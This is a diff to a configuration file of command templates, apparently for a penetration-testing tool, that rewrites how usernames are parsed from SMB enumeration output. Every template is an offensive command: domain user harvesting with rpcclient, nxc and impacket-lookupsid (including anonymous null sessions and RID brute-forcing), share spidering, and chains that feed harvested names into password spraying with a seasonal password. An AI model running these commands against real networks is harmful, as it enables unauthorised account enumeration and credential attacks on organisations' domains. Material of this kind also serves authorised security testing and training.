@@ -7,6 +7,7 @@ order = 20
 #   share=SHARE_NAME   remote_path=\\path\\to\\file   local_path=./loot
 #   userlist=users.txt   wordlist=/usr/share/wordlists/rockyou.txt
 #   spray_password=Spring2026!   — spray pass (not the same as cred profile {password})
+# Harvest parsers use sed/awk (not cut -d'\\' — breaks on macOS). Awk braces in templates: {{ }}.
 #   new_password / computer_password — see ad-chains.toml header
 #
 # smbclient auth quick ref:
@@ -338,7 +339,7 @@ tags = ["enum", "rpc", "pass-pol"]
 id = "smb.harvest.rpcclient_users"
 title = "rpcclient → users.txt (parsed sAMAccountNames)"
 template = """rpcclient -U '{smb_user_spec}' {target} -c 'enumdomusers' 2>/dev/null \\
- | grep 'user:' | awk -F'[][]' '{print $2}' | sort -u > {userlist} \\
+ | grep 'user:' | sed -n 's/user:\\[\\([^]]*\\)\\].*/\\1/p' | sort -u > {userlist} \\
  && wc -l {userlist} && head {userlist}"""
 requires = ["rpcclient"]
 tags = ["harvest", "users", "output"]
@@ -347,7 +348,7 @@ tags = ["harvest", "users", "output"]
 id = "smb.harvest.nxc_users"
 title = "nxc smb --users → users.txt"
 template = """nxc smb {target} {nxc_auth} --users 2>/dev/null \\
- | awk '/\\\\/ {print $NF}' | cut -d'\\\\' -f2 | sort -u > {userlist} \\
+ | awk '/\\\\/ {{u=$NF; gsub(/^.*\\\\/, "", u); print u}}' | sort -u > {userlist} \\
  && wc -l {userlist} && head {userlist}"""
 requires = ["nxc"]
 tags = ["harvest", "users", "output", "nxc"]
@@ -356,7 +357,7 @@ tags = ["harvest", "users", "output", "nxc"]
 id = "smb.harvest.nxc_ridbrute_users"
 title = "nxc smb --rid-brute → users.txt"
 template = """nxc smb {target} {nxc_auth} --rid-brute 2>/dev/null \\
- | awk '/SidTypeUser/ {print $NF}' | sort -u > {userlist} \\
+ | awk '/SidTypeUser/ {{u=$(NF-1); gsub(/^.*\\\\/, "", u); print u}}' | sort -u > {userlist} \\
  && wc -l {userlist} && head {userlist}"""
 requires = ["nxc"]
 tags = ["harvest", "users", "output", "nxc", "rid"]
@@ -365,7 +366,7 @@ tags = ["harvest", "users", "output", "nxc", "rid"]
 id = "smb.harvest.lookupsid_users"
 title = "impacket-lookupsid → users.txt"
 template = """impacket-lookupsid '{user_at_domain}:{password}@{target}' 20000 2>/dev/null \\
- | grep 'SidTypeUser' | awk '{print $2}' | cut -d'\\\\' -f2 | sort -u > {userlist} \\
+ | grep 'SidTypeUser' | awk '{{u=$2; gsub(/^.*\\\\/, "", u); print u}}' | sort -u > {userlist} \\
  && wc -l {userlist} && head {userlist}"""
 requires = ["impacket-lookupsid"]
 tags = ["harvest", "users", "output", "rid"]
@@ -375,7 +376,7 @@ when = "creds.kind == 'plaintext'"
 id = "smb.harvest.lookupsid_null"
 title = "impacket-lookupsid (null) → users.txt"
 template = """impacket-lookupsid {target}/anonymous@{target} 20000 2>/dev/null \\
- | grep 'SidTypeUser' | awk '{print $2}' | cut -d'\\\\' -f2 | sort -u > {userlist} \\
+ | grep 'SidTypeUser' | awk '{{u=$2; gsub(/^.*\\\\/, "", u); print u}}' | sort -u > {userlist} \\
  && wc -l {userlist} && head {userlist}"""
 requires = ["impacket-lookupsid"]
 tags = ["harvest", "users", "output", "rid", "unauth"]
@@ -393,9 +394,9 @@ tags = ["harvest", "users", "output"]
 id = "smb.harvest.combined"
 title = "Multi-source user harvest → users.txt"
 template = """mkdir -p loot && : > loot/all_users.txt \\
- && (rpcclient -U '{smb_user_spec}' {target} -c 'enumdomusers' 2>/dev/null | grep 'user:' | awk -F'[][]' '{print $2}') >> loot/all_users.txt \\
- && (nxc smb {target} {nxc_auth} --users 2>/dev/null | awk '/\\\\/ {print $NF}' | cut -d'\\\\' -f2) >> loot/all_users.txt \\
- && (nxc smb {target} {nxc_auth} --rid-brute 2>/dev/null | awk '/SidTypeUser/ {print $NF}') >> loot/all_users.txt \\
+ && (rpcclient -U '{smb_user_spec}' {target} -c 'enumdomusers' 2>/dev/null | grep 'user:' | sed -n 's/user:\\[\\([^]]*\\)\\].*/\\1/p') >> loot/all_users.txt \\
+ && (nxc smb {target} {nxc_auth} --users 2>/dev/null | awk '/\\\\/ {{u=$NF; gsub(/^.*\\\\/, "", u); print u}}') >> loot/all_users.txt \\
+ && (nxc smb {target} {nxc_auth} --rid-brute 2>/dev/null | awk '/SidTypeUser/ {{u=$(NF-1); gsub(/^.*\\\\/, "", u); print u}}') >> loot/all_users.txt \\
  && sort -u loot/all_users.txt > {userlist} \\
  && wc -l {userlist} && head {userlist}"""
 requires = ["rpcclient", "nxc"]
@@ -689,7 +690,7 @@ when = "creds.kind in ['plaintext','ntlm']"
 id = "smb.chain.enum_to_spray"
 title = "Harvest users → password spray"
 template = """nxc smb {target} {nxc_auth} --users 2>/dev/null \\
- | awk '/\\\\/ {print $NF}' | cut -d'\\\\' -f2 | sort -u > {userlist} \\
+ | awk '/\\\\/ {{u=$NF; gsub(/^.*\\\\/, "", u); print u}}' | sort -u > {userlist} \\
  && nxc smb {target} -u {userlist} -p '{spray_password}' --continue-on-success"""
 requires = ["nxc"]
 tags = ["chain", "spray", "harvest"]
@@ -707,7 +708,7 @@ id = "smb.chain.authed_spider_spray"
 title = "Spider shares → harvest users → spray"
 template = """nxc smb {target} {nxc_auth} -M spider_plus -o DOWNLOAD_FLAG=False \\
  && nxc smb {target} {nxc_auth} --users --rid-brute \\
- | awk '/SidTypeUser/ {print $NF} /\\\\/ {print $NF}' | cut -d'\\\\' -f2 | sort -u > {userlist} \\
+ | awk '/SidTypeUser/ {{u=$(NF-1); gsub(/^.*\\\\/, "", u); print u; next}} /\\\\/ {{u=$NF; gsub(/^.*\\\\/, "", u); print u}}' | sort -u > {userlist} \\
  && nxc smb {target} -u {userlist} -p '{spray_password}' --jitter 3 --continue-on-success"""
 requires = ["nxc"]
 tags = ["chain", "spider", "spray", "harvest"]
